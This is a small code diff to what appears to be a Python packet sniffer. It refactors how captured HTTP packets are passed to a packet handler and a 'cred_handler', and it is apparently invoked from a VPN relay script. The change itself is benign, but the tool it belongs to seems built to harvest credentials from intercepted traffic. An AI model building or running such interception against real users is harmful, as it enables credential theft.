@@ -409,10 +409,14 @@ def sniff_loop(iface=None) -> None:
 
     Called by vpn_relay.py; the __main__ block below remains standalone-compatible.
     """
+    def _dispatch(pkt):
+        packet_handler(pkt)
+        cred_handler(pkt)
+
     sniff(
         iface=iface,
         filter=f"tcp port {HTTP_PORT}",
-        prn=lambda pkt: (packet_handler(pkt), cred_handler(pkt)),
+        prn=_dispatch,
         store=False,
     )
 
